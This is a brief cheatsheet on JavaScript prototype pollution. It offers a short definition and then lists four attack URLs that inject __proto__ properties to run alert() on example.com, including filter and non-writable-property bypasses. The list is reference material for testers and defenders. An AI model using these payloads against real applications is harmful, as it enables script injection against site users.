---
title: Prototype pollution
description: Prototype pollution cheatsheets.
---

# Prototype pollution

## Definition

Prototype pollution is a type of vulnerability that occurs when an attacker is able to manipulate the prototype of an object in a JavaScript application. This can allow the attacker to add or modify properties on the object, which can have serious consequences for the security and functionality of the application.

In JavaScript, the prototype of an object is a property that specifies the object from which it inherits properties. When an object is created, it can inherit properties from its prototype, and these properties can be accessed and modified using the object's prototype property.

Prototype pollution occurs when an attacker is able to manipulate the prototype of an object in a way that allows them to add or modify properties on the object. This can be done using a variety of techniques, such as injecting malicious data into the application or using specially crafted payloads to exploit vulnerabilities in the application's code.

## Attacks

- `https://example.com/?search=toto&__proto__[transport_url]=data:,alert(1)`
- `https://example.com/?search=toto&__proto__.sequence='1')};alert()//`
- Bypass non writable object using `Object.defineProperty()`'s `value` attribute : `https://example.com/?__proto__[value]=data:,alert(1)`
- Bypass filter `https://example.com/?__pro__proto__to__[transport_url]=data:,alert()`
